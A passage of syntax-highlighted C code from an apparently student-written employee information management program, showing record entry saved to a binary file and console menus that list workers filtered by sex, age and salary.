operator">-></span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入家庭住址："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工联系方式："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"ab+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//这段程序是结束函数块的，如果没有这段代码后面内容还会继续输出。</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>workers<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//将数据存入函数中；</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    NUM<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp1<span class="token punctuation">;</span>    fp1<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span><span class="token string">"w+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">itoa</span><span class="token punctuation">(</span>NUM<span class="token punctuation">,</span>ch<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//一个没学过的函数，把整形数转化成字符型；</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    使用外部变量NUM，在使用者使用程序时先行为，NUM赋值；    */</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_2</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//浏览已经写入的数据；</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.浏览全部信息                 2.按性别方式筛选       ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   3.按年龄方式筛选               4.按薪资筛选           ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入筛选的方式\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要筛选的员工性别编号\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.男性    \t\t     2.女性\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">,</span><span class="token string">"男"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">,</span><span class="token string">"女"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好像想查询什么奇奇怪怪的东西！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要筛选的员工薪资范围\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.青年    \t\t     2.壮年\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">30</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">30</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好像想查询什么奇奇怪怪的东西！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要筛选的员工薪资范围\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.低薪    \t\t     2.中薪\t\t\t  3.高薪\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">3000</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token 